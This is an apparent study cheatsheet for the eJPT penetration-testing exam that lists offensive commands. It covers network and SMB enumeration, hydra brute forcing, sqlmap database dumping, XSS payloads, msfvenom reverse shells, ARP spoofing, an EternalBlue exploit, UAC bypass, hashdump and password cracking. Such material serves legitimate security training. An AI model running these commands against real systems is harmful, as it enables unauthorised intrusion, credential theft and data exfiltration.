#### Twiter : https://twitter.com/SopLills       

#### linkedin : https://www.linkedin.com/in/sattam-almohsen/

#### Youtube : https://www.youtube.com/channel/UCLHbnIG05-F5xw6kvNt47nQ 
--------------------------------------------------------------------------------------------------
# eJPT-Cheatsheet            
This is a Cheatsheet for eJPT Exam & Course.

## Nmap
```sh
nmap -sn 10.10.10.0/24                             #Host Discover
nmap -sV -p- -iL 10.10.10.10 -oN nmap.initial 
nmap -A -p- -iL 10.10.10.10 -oN nmap.aggressive 
nmap -p<port> --script=vuln 10.10.10.10            #Vulnerabillity Assessment
```
## fPing
```sh
fping -a -g 10.10.10.0/24 2>/dev/null              #Host Discover
``` 
## IP Route
**Syntax**\
ip route add \<Network-range\> via \<router-IP\> dev \<interface\>
```sh
ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0

ip route        # Checking defined routes in linux
route           # Checking defined routes in linux
route print     # Checking defined routes in windows
```
## Networking Commands

**Finding for IP Address and Mac Address**
```sh
ipconfig /all       #Windows
ifconfig            #linux 
```
**Checking Specific Host**
```sh
ping 10.10.10.10     #allow a user to test and verify if a destination IP Address exists 
```
**Using to Trace the Route an IP Packet**
```sh
tracert    google.com     #Windows 
traceroute google.com     #Linux
```
**Checking for ARP Tables**
```sh
arp -a               #To show ARP Tables Windows 
ip neighbour         #ARP Tables Linux
```
**Checking for Listening Ports on a Machine**
```sh
netstat -ano        #Windows
netstat -tlunp      #linux           
```
## John
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
## Dirbuster

![alt text](https://github.com/SattamInfosec/SattamInfosec/blob/main/Dirbuster.PNG)


## Gobuster 
```sh
gobuster dir -u http://example.com -w /usr/usr/wordlists/dirb/common.txt 

gobuster dir -u http://example.com -w /usr/usr/wordlists/dirb/common.txt -x php 
```


## Netcat
**Listening for reverse shell**
```sh
nc -nvlp 1234
```
**Banner Grabbing**
```sh
nc -nv 10.10.10.10 \<port\>
```
## SQLMap
#### Check if injection exists
```sh
sqlmap -r Post.req
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
```
#### Get database if injection Exists
```sh
sqlmap -r login.req --dbs
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
```
#### Get Tables in a Database
```sh
sqlmap -r login.req -D dbname --tables 
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
```
#### Get data in a Database tables
```sh
sqlmap -r login.req -D dbname -T table_name --dump
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
```
## MYSQL

**Remotely**
```sh
mysql -u <user> -p<password> -h <IP> -D <dbname>
```
**Locally**
```sh
mysql -u <user> -p<password>
```

## Hydra
**SSH & FTP Login Bruteforcing**
```sh
hydra -L userslist -P passwordslist ftp://10.10.10.10
hydra -l root -P passwordslist ssh://10.10.10.10 
hydra -L userlist -p password123 ftp://10.10.10.10
```          

**HTTP POST Form**
```sh
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

*You will know which wordlists to use when the time comes*


## XSS
```sh
<script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script>alert('XSS')</script>
<ScRiPt>alert('XSS')</ScRiPt>
```
*This is a great filter bypass cheatsheet*\
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## XSS via GET & POST Request

![alt text](https://raw.githubusercontent.com/SattamInfosec/SattamInfosec/main/XSS%20Via%20GET%20%26%20POST.PNG)

## msfvenom shells
**JSP Java Meterpreter Reverse TCP**
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```
**EXE**
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```
**PHP**
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
## ARPSpoof
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <interface> -t <target> -r <host>
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
```
## SMB Enumeration
**Get shares, users, groups, password policy**
```sh
smbclient -L //10.10.10.10/
enum4linux -U -M -S -P -G 10.10.10.10
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 
nmap -p445 --script=smb-vuln-* 10.10.10.10 
```
**Access Share**
```sh
smbclient //10.10.10.10/share_name
```
## FTP Enumeration
```sh
nmap --script=ftp-anon 10.10.10.10 -p21 
nmap -A -p21 10.10.10.10 
```

**Login to FTP Server**
```sh
ftp 10.10.10.10
```
## FTP Server Commands
```sh
get filename               #to Receive file
put filename               #to upload file 
cd /../..                  #to Change remote working directory
ls /..                     #to List contents of remote directory
```
## Metasploit Freamwork
```sh
msfconsole                        #To run the Freamwork
search <Exploit_Module>           #Search for a specific module 
show exploits                     #Aonther way to display exploits
show payloads                     #display payloads
use exploit/windows/smb/ms17_010_psexec        #to use exploit 
show options                      #Check options and required value
set <OpationName> value           #To configure an option
exploit                           #Execution of exploitation
``` 
## Metasploit Meterpreter autoroute
```sh
run autoroute -s 10.10.10.0/24
```
## Meterpreter
```sh
ps
getuid
getpid
getsystem
search -f *.txt     #search file 
download Filename /root/****               #Download From victm machine to your machine 
upload   /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
shell               #run a standard operating system shell 
sysinfo             #information about the victm Machine 
background          #Switch from a Meterpreter session to the msfconsole command line 
```
**CHECK UAC/Privileges**
```sh
run post/windows/gather/win_privs
```
**BYPASS UAC**
*Background the session first*
```sh
exploit/windows/local/bypassuac
set session
```
## MS17-010 EternalBlue SMB Remote
```sh
exploit(windows/smb/ms17_010_psexec)> set RHOST </Target-IP\>
exploit(windows/smb/ms17_010_psexec)> set LHOST </Attacker-IP\>
exploit(windows/smb/ms17_010_psexec)> run 
```
**After PrivEsc**
```sh
migrate </pid\>   
hashdump          #To extract the hash Passwords and Users  
``` 
## Windows Command Line
**To search for files and Folders**
```sh
dir /b/s "\*.conf\*"
dir /b/s "\*.txt\*"
dir /b/s "\*filename\*"
cd         #it's the same as 'pwd' command in linux
type       #it's the same as 'cat' command in linux
systeminfo         #information about the Operating System
```



**Check Users**
```sh
net users         #Users in windows 
cat /etc/passwd   #Users in linux  
```

**List drives on the machine**
```sh
fsutil fsinfo drives     #windows 
lsblk -l                 #Linux
```



